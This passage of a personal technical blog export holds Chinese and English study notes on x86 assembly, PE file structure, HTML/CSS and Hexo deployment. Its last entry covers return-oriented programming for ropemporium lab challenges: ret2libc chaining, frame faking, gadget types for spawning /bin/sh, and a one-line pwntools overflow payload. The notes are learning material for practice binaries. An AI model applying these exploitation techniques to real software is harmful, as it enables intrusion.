<h6 id="LEA-Load-Effective-Address"><a href="#LEA-Load-Effective-Address" class="headerlink" title="LEA (Load Effective Address)"></a>LEA (Load Effective Address)</h6><p>Syntax: LEA dest,src<br>LEA can be treated the same way as the MOV instruction. It isn’t used too much for its original function, but more for quick multiplications like this:<br>   <code>  lea eax, dword ptr [4*ecx+ebx]</code><br> *<em>which gives eax the value of 4</em>ecx+ebx**<br><del>ptr== pointer</del></p>
<h6 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h6><p>Syntax: POP dest<br>POP loads the value of byte/word/dword ptr <strong>[esp] jian接寻址 esp指向的值zuo wei dizhi</strong>and puts it into dest. </p>
<h6 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h6><p>Syntax: TEST operand1, operand2<br>This instruction is in 99% of all cases used for “TEST EAX, EAX”. It performs a Logical<br>AND(AND instruction)<code> but does not save the values</code>.** It only sets the Z-Flag, when EAX is 0 or clears it, when EAX is not 0. The O/C flags are always cleared.**</p>
<h6 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h6><p>Syntax: XOR dest,src<br>The XOR instruction connects two values using logical exclusive OR (remember OR uses inclusive OR).<br><code>This instruction clears the O-Flag and the C-Flag and can set the Z-Flag.</code><br>To understand XOR better, consider those two binary values:</p>
<pre><code>                                1001010110
                                0101001101</code></pre>
<p><code> If you XOR them, the result is 1100011011</code></p>
<p>The most often seen use of XOR is “XOR, EAX, EAX”.<code> This will set EAX to 0,</code> because when you XOR a value with itself, the result is always 0. I hope you understand why, else<br>write down a value on paper and try ;)</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>《逆向工程核心原理》学习笔记3</title>
    <url>/2019/11/21/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<ol>
<li>windows程序运行在Ring 3级，但要运行在内核级（Ring 0），使用API请求，API存储在dll中</li>
<li>FFFFFFFF==-1</li>
<li>双击可改变FLAG 寄存器值<a id="more"></a></li>
<li>双击EIP回去 in ollydbg</li>
<li>info 从一个API中返回总在EAX中</li>
<li>PE文件。内存节区头要在各自最小基本单位的倍数上，所以使用NULL填充</li>
<li>RVA+imageBase==VA(绝对地址）</li>
<li>PE头内部使用RVA</li>
<li>4D5A =,,,MZ （PE文件开头，IMAGE_DOS_HEADER)</li>
<li>INTEL 小端序：：e_lfanew==000000E0</li>
<li>32位EXE ImageBase == 00400000</li>
</ol>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>《逆向工程核心原理》学习笔记4</title>
    <url>/2019/11/29/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/</url>
    <content><![CDATA[<p>在PE文件中找到什么，在内存同样可以找到</p>
<h5 id="PE文件组成"><a href="#PE文件组成" class="headerlink" title="PE文件组成"></a>PE文件组成</h5><pre><code>DOS header 
DOS stub
PE file header
Image Optional Header
Section table
Data Directories
Sections</code></pre>
<a id="more"></a>
<p>PE header 通常位于[imagebase]~[imagebase+1000]<br>memory double click</p>
<p>改变PE entry point 以跳过一些代码<br>binary fill with nops<br>PE header通常大小是1000h</p>
<p>EAT 库用来方便其他程序使用函数</p>
<h5 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h5><p>弹出消息框的地方，pased， alt+f9  , 再点消息框（80%的情况下有用）<br>在memory窗口下搜索，内存中的数据<br>find reference </p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>前端学习_html_css_1</title>
    <url>/2020/10/29/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0_html_css_1/</url>
    <content><![CDATA[<h2 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p><em>连接 80 端口需要管理员权限（非管理员用户只能监听大于 1024 的端口</em></p>
<p><em>流（stream）代表一个客户端和服务端之间打开的连接。</em></p>
<p>？闭包作为参数？</p>
<a id="more"></a>
<hr>
<h4 id=""><a href="#" class="headerlink" title=""></a><!DOCTYPE html></h4><p>— 文档类型。混沌初分，HTML 尚在襁褓（大约是 1991/92 年）之时，DOCTYPE 用来链接一些 HTML 编写守则，比如自动查错之类。DOCTYPE 在当今作用有限，仅用于保证文档正常读取。现在知道这些就足够了。</p>
<h4 id="html-1"><a href="#html-1" class="headerlink" title="html"></a>html</h4><p><code>&lt;html&gt;</code> 元素。<br>该元素包含整个页面的内容，也称作根元素。</p>
<h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p><code>&lt;head&gt;</code>元素。该元素的内容对用户不可见，其中包含例如面向搜索引擎的搜索关键字（keywords）、页面描述、CSS 样式表和字符编码声明等。</p>
<p><code>&lt;meta charset=&quot;utf-8&quot;&gt; </code><br>该元素指定文档使用 UTF-8 字符编码 ，UTF-8 包括绝大多数人类已知语言的字符。基本上 UTF-8 可以处理任何文本内容，还可以避免以后出现某些问题，没有理由再选用其他编码。</p>
<p><code>&lt;title&gt; </code>元素。该元素设置页面的标题，显示在浏览器标签页上，也作为收藏网页的描述文字。</p>
<h4 id="body"><a href="#body" class="headerlink" title="body"></a>body</h4><p><code>&lt;body&gt; </code>元素。该元素包含期望让用户在访问页面时看到的内容，包括文本、图像、视频、游戏、可播放的音轨或其他内容。</p>
<h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><pre><code>&lt;img src=&quot;images/firefox-icon.png&quot; alt=&quot;测试图片&quot;&gt;</code></pre>
<p><code>alt</code>，是图像的描述内容 属性<br><code>src</code>也是属性，资源</p>
<h4 id="列表list"><a href="#列表list" class="headerlink" title="列表list"></a>列表list</h4><p>ul无序<br>ol有序<br>列表的每个项目用一个列表项目（List Item）元素 <code>&lt;li&gt;</code> 包围</p>
<pre><code>&lt;ul&gt;  无序列表
  &lt;li&gt;技术人员&lt;/li&gt;
  &lt;li&gt;思考者&lt;/li&gt;
  &lt;li&gt;建造者&lt;/li&gt;
&lt;/ul&gt;</code></pre>
<hr>
<p>####a<br>链接非常重要 — 它们赋予 Web 网络属性。要植入一个链接，我们需要使用一个简单的元素 — <code>&lt;a&gt;</code> — a 是 “anchor” （锚）的缩写</p>
<pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/about/manifesto/&quot;&gt;Mozilla 宣言&lt;/a&gt;</code></pre>
<p>href是属性</p>
<h4 id="测试本地文件"><a href="#测试本地文件" class="headerlink" title="测试本地文件"></a>测试本地文件</h4><p>它们具有服务端代码。 服务器端语言（如 PHP 或 Python）需要一个特殊的服务器来解释代码并提供结果。</p>
<p>层叠样式表（Cascading Style Sheet，简称：CSS）是为网页添加样式的代码<br>要选择一个 HTML 页面里所有的段落元素，然后将其中的文本改成红色，可以这样写 CSS<br>p {<br>  color: red;<br>}<br>再将该 CSS 文件连接至 HTML 文档，否则 CSS 代码不会对 HTML 文档在浏览器里的显示效果有任何影响</p>
<p>JavaScript（缩写：JS）是一门完备的 动态编程语言</p>
<p>对象：JavaScript 里一切皆对象，一切皆可储存在变量里。</p>
<p>例如disabled 属性，他们可以标记表单输入使之变为不可用(变灰色)，</p>
<p>实体引用： 在HTML中包含特殊字符</p>
<pre><code>&lt;    &amp;lt;
&gt;    &amp;gt;
&quot;    &amp;quot;
&#39;    &amp;apos;
&amp;    &amp;amp;</code></pre>
<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>HTML中的内容置为注释，你需要将其用特殊的记号<code>&lt;!--</code>和<code>--&gt;</code>包括起来</p>
<h4 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h4><p>许多<code>&lt;meta&gt; </code>元素包含了name 和 content 特性：</p>
<p>name 指定了meta 元素的类型； 说明该元素包含了什么类型的信息。<br>content 指定了实际的元数据内容。</p>
<hr>
<h4 id="span"><a href="#span" class="headerlink" title="span"></a>span</h4><p>在你的站点增加自定义图标<br>这是一个 <code>&lt;span&gt; </code>元素，它<code>没有语义</code>。当您想要对它用CSS（或者JS）时，您可以用它包裹内容，且不需要附加任何额外的意义</p>
<hr>
<h4 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h4><p>无序<code>&lt;ul&gt;</code><br>有序 Ordered<br><code>&lt;ol&gt;</code> 元素<br>将一个列表嵌入到另一个列表是完全可以的<br>用<code>&lt;em&gt;</code>（emphasis）元素来标记斜体<br><code>&lt;strong&gt; </code>加粗<br><code>&lt;i&gt; </code>被用来传达传统上用斜体表达的意义：外国文字，分类名称，技术术语，一种思想……<br><code>&lt;b&gt;</code> 被用来传达传统上用粗体表达的意义：关键字，产品名称，引导句……<br><code>&lt;u&gt;</code> 被用来传达传统上用下划线表达的意义：专有名词，拼写错误……<br>不要用</p>
<h4 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h4><pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;Mozilla 主页&lt;/a&gt;</code></pre>
<p>alt属性添加支持信息</p>
<pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;
  &lt;img src=&quot;mozilla-image.png&quot; alt=&quot;链接至 Mozilla 主页的 Mozilla 标志&quot;&gt;
&lt;/a&gt;</code></pre>
<p>可以有两个index.html文件，前提是他们在不同的目录下</p>
<p>指向上级目录： 如果你想在projects/index.html中包含一个指向pdfs/project-brief.pdf的超链接，你必须先返回上级目录，然后再回到pdf目录。“返回上一个目录级”使用两个英文点号表示 — <code>..</code> — 所以你应该使用的URL是<code> ../pdfs/project-brief.pdf</code></p>
<p>超链接除了可以链接到文档外，也可以链接到HTML文档的特定部分（被称为文档片段）。必须首先给要链接到的元素分配一个id属性</p>
<pre><code>&lt;a href=&quot;contacts.html#Mailing_address&quot;&gt;我们的地址&lt;/a&gt;
&lt;a href=&quot;#Mailing_address&quot;&gt;</code></pre>
<p>当链接到同一网站的其他位置时，你应该使用相对链接（当链接到另一个网站时，你需要使用绝对链接<br>使用绝对URL时，浏览器首先通过DNS（见万维网是如何工作的）查找服务器的真实位置</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://download.mozilla.org/?product=firefox-latest-ssl&amp;os=win64&amp;lang=zh-CN&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">download</span>=<span class="string">&quot;firefox-latest-64bit-installer.exe&quot;</span>&gt;</span>  默认保存文件名</span><br></pre></td></tr></table></figure>


<hr>
<h4 id="网站结构"><a href="#网站结构" class="headerlink" title="网站结构"></a>网站结构</h4><p>创建网站的一种常见方式——每一页都使用相同的页面结构，包括相同的导航菜单</p>
<pre><code>&lt;a href=&quot;mailto:nowhere@mozilla.org&quot;&gt;向 nowhere 发邮件&lt;/a&gt;</code></pre>
<p>使用上标和下标。 <code>&lt;sup&gt;</code> 和<code>&lt;sub&gt;</code>元素可</p>
<pre><code>&lt;p&gt;如果 x&lt;sup&gt;2&lt;/sup&gt; 的值为 9，那么 x 的值必为 3 或 -3。&lt;/p&gt;</code></pre>
<p>为了实现语义化标记，HTML 提供了明确这些区段的专用标签，例如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>：页眉。</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span>：导航栏。</span><br><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>：主内容。主内容中还可以有各种子内容区段，可用<span class="tag">&lt;<span class="name">article</span>&gt;</span>、<span class="tag">&lt;<span class="name">section</span>&gt;</span> 和 <span class="tag">&lt;<span class="name">div</span>&gt;</span> 等元素表示。</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span>：侧边栏，经常嵌套在 <span class="tag">&lt;<span class="name">main</span>&gt;</span> 中。</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span>：页脚。</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span> 是一个内联的（inline）无语义元素，使用 class 属性提供一些标签，使这些元素能易于查询</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> 是一个块级无语义元素，应仅用于找不到更好的块级元素时，或者不想增加特定的意义时</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> 可在段落中进行换行</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span> 元素在文档中生成一条水平分割线</span><br></pre></td></tr></table></figure>


<p><code>&lt;iframe&gt;</code><br>元素旨在允许您将其他Web文档嵌入到当前文档中</p>
<h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>给 HTML 元素加个类名（class），在 CSS 中再选中那个类名</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;special&quot;</span>&gt;</span></span><br><span class="line">css中</span><br><span class="line">.special &#123;</span><br><span class="line">  color: orange;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h4><p>重要：：选择嵌套在<code>&lt;li&gt;</code> 元素内的<code>&lt;em&gt;</code>我们可以使用一个称为包含选择符的选择器，它只是单纯地在两个选择器之间加上一个空格</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">li</span> <span class="selector-tag">em</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: rebeccapurple;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置直接出现在标题后面并且与标题具有相同层级的段落样式，为此需在两个选择器之间添加一个 + 号 (成为 相邻选择符)</p>
<p>根据状态确定样式</p>
<pre><code>a:link
a:hover

article p span &#123; ... &#125;
h1 + ul + p &#123; ... &#125;</code></pre>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> <span class="selector-tag">h1</span> + <span class="selector-tag">p</span> <span class="selector-class">.special</span> &#123;</span><br><span class="line">在&lt;body&gt;之内，紧接在&lt;h1&gt;后面的&lt;p&gt;元素的内部，类名为special。</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="css属性"><a href="#css属性" class="headerlink" title="css属性"></a>css属性</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">font-size</span></span><br><span class="line"><span class="selector-tag">width</span></span><br><span class="line"><span class="selector-tag">background-color</span></span><br><span class="line"><span class="selector-tag">color</span></span><br><span class="line"><span class="selector-tag">border</span></span><br></pre></td></tr></table></figure>

<p><code>calc()</code>函数 进行简单计算<br><code>rotate()</code></p>
<hr>
<h4 id="额外样式表"><a href="#额外样式表" class="headerlink" title="额外样式表"></a>额外样式表</h4><p>将额外的样式表导入主CSS样式表，可以使用@import:<br><code>@import &#39;styles2.css&#39;;</code></p>
<h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>应用两条<code>同级别</code>的规则（相同规则）<br><code>理解为后面的规则覆盖前面的规则</code></p>
<p>有不同选择器对应相同的元素的时候需要使用哪个规则<br><code>一个元素选择器比类选择器的优先级更低会被其覆盖</code></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">千位： 如果声明在 <span class="selector-tag">style</span> 的属性（内联样式）则该位得一分。这样的声明没有选择器，所以它得分总是1000。</span><br><span class="line">百位： 选择器中包含<span class="selector-tag">ID</span>选择器则该位得一分。</span><br><span class="line">十位： 选择器中包含类选择器、属性选择器或者伪类则该位得一分。</span><br><span class="line">个位：选择器中包含元素、伪元素选择器则该位得一分。</span><br></pre></td></tr></table></figure>
<h4 id="class-id"><a href="#class-id" class="headerlink" title="class id"></a>class id</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;outer&quot; class=&quot;container&quot;&gt;</span><br><span class="line"><span class="selector-id">#outer</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>id 对应<code> #outer</code><br>class对应<code>.container</code></p>
<h4 id="盒子"><a href="#盒子" class="headerlink" title="盒子"></a>盒子</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">标题(&lt;<span class="selector-tag">h1</span>&gt;等)和段落(&lt;<span class="selector-tag">p</span>&gt;)默认情况下都是块级的盒子</span><br><span class="line">做链接的 &lt;<span class="selector-tag">a</span>&gt; 元素、 &lt;<span class="selector-tag">span</span>&gt;、 &lt;<span class="selector-tag">em</span>&gt; 以及 &lt;<span class="selector-tag">strong</span>&gt; 都是默认处于 <span class="selector-tag">inline</span> 状态的</span><br><span class="line">＜<span class="selector-tag">div</span>＞块级元素</span><br><span class="line">盒子<span class="selector-tag">display</span> 属性的设置，比如 <span class="selector-tag">inline</span> 或者 <span class="selector-tag">block</span> ，来控制盒子的外部显示类型</span><br><span class="line">在标准模型中，如果你给盒设置 <span class="selector-tag">width</span> 和 <span class="selector-tag">height</span>，实际设置的是 <span class="selector-tag">content</span> <span class="selector-tag">box</span></span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/BJ5qkq"><img src="https://s1.ax1x.com/2020/10/29/BJ5qkq.jpg" alt="BJ5qkq.jpg"></a><br>替代盒模型，width就是盒的宽度，而不是content的宽度</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line">*, *<span class="selector-pseudo">::before</span>, *<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: inherit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有两个外边距相接的元素，这些外边距将合并为一个外边距，即最大的单个外边距的大小</p>
<hr>
<h4 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h4><p>元素使用 display: inline-block，实现我们需要的块级的部分效果：</p>
<p>设置width 和height 属性会生效。<br>padding, margin, 以及border 会推开其他元素。</p>
<hr>
<h4 id="背景图像"><a href="#背景图像" class="headerlink" title="背景图像"></a>背景图像</h4><p>默认情况下，大图不会缩小以适应方框，因此我们只能看到它的一个小角，而小图则是平铺以填充方框</p>
<p><code>background-repeat</code>属性用于控制图像的平铺行为</p>
<p><code>background-size</code>属性，它可以设置长度或百分比值，来调整图像的大小以适应背景</p>
<p>背景是指定他们如何滚动时，内容滚动。这是由<code>background-attachment</code>属性控制的</p>
<p><code>border-radius</code>属性和与方框的每个角相关的长边来实现方框的圆角</p>
<p><code>background-color:rgba(0,0,0,.5);</code><br>RGBA颜色　第四个值表示颜色的alpha通道，它控制<code>不透明度</code>。如果将这个值设置为0，它将使颜色完全透明<br>半透明的黑色背景颜色</p>
<h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">overflow</span>属性</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">hidden</span>　隐藏掉溢出</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">scroll</span>　你的浏览器总会显示滚动条</span><br><span class="line"><span class="selector-tag">overflow-x</span>　　　－ｙ</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">auto</span>　　</span><br></pre></td></tr></table></figure>

<h4 id="绝对长度单位"><a href="#绝对长度单位" class="headerlink" title="绝对长度单位"></a>绝对长度单位</h4><p><code>px    像素　＝1/96ｃｍ</code></p>
<h4 id="相对长度单位"><a href="#相对长度单位" class="headerlink" title="相对长度单位"></a>相对长度单位</h4><p><code>em</code>    在 font-size 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 width</p>
<p>总是想让它至少有个确定的高度，你应该给它设置一个min-height属性</p>
<h4 id="图片溢出"><a href="#图片溢出" class="headerlink" title="图片溢出"></a>图片溢出</h4><p>一张图片的max-width设为100%。<br><code>max－width:100%　　</code>指的是父容器宽度的百分数<br>技术是用来让图片可响应的，所以在更小的设备上浏览的时候，它们会合适地缩放，但会先加载大的图像，在缩放</p>
<p>主页cargo-generate</p>
]]></content>
      <tags>
        <tag>FRONT-END</tag>
      </tags>
  </entry>
  <entry>
    <title>在新电脑上重新部署hexo</title>
    <url>/2019/11/19/%E5%9C%A8%E6%96%B0%E7%94%B5%E8%84%91%E4%B8%8A%E9%87%8D%E6%96%B0%E9%83%A8%E7%BD%B2hexo/</url>
    <content><![CDATA[<p>近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了</p>
<h4 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h4><p><a href="https://hexo.io/docs/" title="hexo安装">hexo安装</a>遵循该页面进行<strong>git</strong>和<strong>nodejs</strong>的安装<br><code>将之前的hexo文件整个拷贝过来</code></p>
<a id="more"></a>
<h4 id="2-配置SSH"><a href="#2-配置SSH" class="headerlink" title="2. 配置SSH"></a>2. 配置SSH</h4><p>生成rsa公私钥</p>
<pre><code>$ cd ~/.ssh
# Checks to see if there is a directory named &quot;.ssh&quot; in your user directory

$ ssh-keygen -t rsa -C &quot;your_email@example.com&quot;
# Creates a new ssh key using the provided email
Generating public/private rsa key pair.
Enter file in which to save the key (/home/you/.ssh/id_rsa):</code></pre>
<p>然后在GitHub里添加公钥，在项目的setting里有一<code>deploy key</code>，在这里添加公钥<br>使用下列命令验证</p>
<pre><code>ssh -T git@github.com</code></pre>
<p>如果不行，就是没有在<code>.ssh</code>文件夹里创建，需要接下来的两步</p>
<pre><code>ssh-agent -s
ssh-add ~/.ssh/id_rsa</code></pre>
<p>若提示要输入密码什么的，则在<code>_config.yml</code>配置文件中修改<code>repo</code></p>
<pre><code>deploy:
  type: git
  repo: git@github.com:chengjianhua/chengjianhua.github.io.git
  branch: master</code></pre>
<p>这样就可以了，不用<code>npm install</code>或<code>initial</code></p>
]]></content>
      <tags>
        <tag>else</tag>
      </tags>
  </entry>
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium前三题</title>
    <url>/2021/01/11/%E5%9F%BA%E6%9C%ACROP/</url>
    <content><![CDATA[<p>简单的ROP学习，没有开启PIE</p>
<h2 id="Bypassing-NX-bit-using-chained-return-to-libc"><a href="#Bypassing-NX-bit-using-chained-return-to-libc" class="headerlink" title="Bypassing NX bit using chained return-to-libc"></a>Bypassing NX bit using chained return-to-libc</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-chained-return-to-libc/</a></p>
<p>system address + exit address + system+args<br>exit相当于下一步地址，因为不是调用call, 不会压入下一步地址</p>
<a id="more"></a>
<p>chaining seteuid, system and exit</p>
<p>问题：<br>1 seteuid_arg should be<code> zero</code><br>2 place function argument of both libc functions，，， a function argument of one libc function and an address of another libc function which is obviously not possible</p>
<p>seteuid_addr + system_addr + <code>seteuid_addr / exit_addr </code>+ system_arg<br> seteuid_addr / exit_addr 这里冲突了，当然是可以舍弃exit的</p>
<p>解决问题2：<br><a href="http://phrack.org/issues/58/4.html">http://phrack.org/issues/58/4.html</a><br>ESP Lifting<br><code>Frame Faking</code></p>
<p>esp lifting technique binary should be compiled without frame pointer (-fomit-frame-pointer) support.</p>
<p>Frame Faking：</p>
<pre><code>用“leave ret” instruction 覆盖返回地址

leave = mov esp,ebp ; pop ebp
ret = pop EIP</code></pre>
<p><a href="https://imgchr.com/i/sMz61K"><img src="https://s3.ax1x.com/2021/01/09/sMz61K.png" alt="sMz61K.png"></a></p>
<p>第一次执行leave;ret时，此时ebp已经是fake_ebp1的地址值，执行完leave后，esp是seteuid_addr的地址，ebp是fake_ebp2的地址值，执行ret后，将<code>seteuid_addr推向eip</code>，参数在ebp+0x4；之后同理，可以执行system()</p>
<p>解决问题1：<br>strcpy which copies a NULL byte into seteuid_arg’s stack location<br>using sprintf NULL byte is copied in to seteuid_arg’s stack location</p>
<p>ROP<br>system(“/bin/sh”)</p>
<p>push binsh_addr<br>call system</p>
<p>call system=<br>push eip+5<br>jmp system</p>
<p>所以栈中system地址要和参数隔四个字节，因为中间还要放返回地址</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><a href="https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf">https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf</a></p>
<h3 id="ROP定义："><a href="#ROP定义：" class="headerlink" title="ROP定义："></a>ROP定义：</h3><p>utilizing <strong>small instruction sequences **available in either the binary or libraries linked to the application called **gadgets</strong></p>
<p>ROP gadgets are small instruction sequences <strong>ending with a “ret” instruction “c3”</strong>.</p>
<p>The ROP gadget has to end with a “ret” to enable us to perform multiple sequences. Hence it is called** return oriented.**<br>所以才叫return , gadget后面都跟着ret</p>
<h3 id="有用的gadget"><a href="#有用的gadget" class="headerlink" title="有用的gadget"></a>有用的gadget</h3><p>1- We search the binary for all “ret” (c3) byte.<br>2- We go backwards to see if the previous byte contains a valid instruction. We reverse to the maximum number of bytes that can make a valid instruction (20 bytes).<br>3- We then record all valid instruction sequences found in the binary or linked libraries.</p>
<h4 id="Loading-a-constant-into-register"><a href="#Loading-a-constant-into-register" class="headerlink" title="Loading a constant into register"></a>Loading a constant into register</h4><p>POP eax; ret;</p>
<p>栈;<br>Address of POP EAX/RET gadget<br>0xdeadbeef<br>Address of next gadget</p>
<h4 id="Loading-from-memory"><a href="#Loading-from-memory" class="headerlink" title="Loading from memory"></a>Loading from memory</h4><p>mov ecx,[eax]; ret</p>
<h4 id="Storing-into-memory"><a href="#Storing-into-memory" class="headerlink" title="Storing into memory"></a>Storing into memory</h4><p>Mov [eax],ecx; ret</p>
<h4 id="Arithmetic-operations"><a href="#Arithmetic-operations" class="headerlink" title="Arithmetic operations"></a>Arithmetic operations</h4><p>add eax,0x0b; ret<br>xor edx,edx;ret</p>
<h4 id="System-call"><a href="#System-call" class="headerlink" title="System call"></a>System call</h4><p>int 0x80; ret<br>call gs:[0x10]; ret</p>
<h4 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h4><p>what libs are linked to the binary<br>gdb:<br><code>info files</code></p>
<pre><code>ps -aux | grep rop2
cat /proc/28119/maps</code></pre>
<p> system call number of execve() is “11” or “0xb”<br> linux system call numbers in “/usr/include/i386-linux-gnu/asm/unistd_32.h “<br>grep execve</p>
<p>it wont affect the command “/bin/sh” is as<br>“/bin//sh”.</p>
<p><code>ROPradget --strings </code></p>
<h2 id="学习ROP的练习平台ropemporium"><a href="#学习ROP的练习平台ropemporium" class="headerlink" title="学习ROP的练习平台ropemporium"></a>学习ROP的练习平台ropemporium</h2><p><a href="https://ropemporium.com/index.html">https://ropemporium.com/index.html</a></p>
<p>起手式命令；；</p>
<h3 id="Confirming-protections"><a href="#Confirming-protections" class="headerlink" title="Confirming protections"></a>Confirming protections</h3><pre><code>$ rabin2 -I &lt;binary&gt;
$ pwn checksec &lt;binary&gt;</code></pre>
<h3 id="Function-names-符号表symbols"><a href="#Function-names-符号表symbols" class="headerlink" title="Function names 符号表symbols"></a>Function names 符号表symbols</h3><pre><code>$ rabin2 -i &lt;binary&gt;

$ nm -u &lt;binary&gt;

$ nm ret2win|grep &#39; t &#39;
Listing just those functions written by the programmer is harder, a rough approximation could be:

$ rabin2 -qs &lt;binary&gt; | grep -ve imp -e &#39; 0 &#39;
-s              symbols
grep
-q              be quiet, just show fewer data
-v, --invert-match        select non-matching lines
-e, --regexp=PATTERNS     use PATTERNS for matching</code></pre>
<h3 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h3><p>查找程序中字符串</p>
<ol>
<li><p><code>strings -d ./ret2win32</code></p>
</li>
<li><p><code>$ rabin2 -z split</code><br>偏移地址都给出了</p>
</li>
<li><p><code>ROPgadget --bianry --strings &#39;/bin/sh&#39;</code></p>
</li>
</ol>
<p>dmesg [options]<br>Display or control the kernel ring buffer.<br>For a quick and dirty confirmation of how many bytes are needed to cause an overflow </p>
<h3 id="题目：："><a href="#题目：：" class="headerlink" title="题目：："></a>题目：：</h3><p><a href="https://blog.csdn.net/SmalOSnail/article/details/106619419">https://blog.csdn.net/SmalOSnail/article/details/106619419</a><br><a href="https://github.com/TaQini/rop_emporium/blob/master/tasks">https://github.com/TaQini/rop_emporium/blob/master/tasks</a><br>大佬代码</p>
<p><a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a><br>我的解题代码</p>
<h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><p><code>p.sendlineafter(&#39;&gt;&#39;,b&#39;A&#39;*40+p64(0x00400756))</code><br>不用考虑截断？？ pwntools自行解决，厉害👍</p>
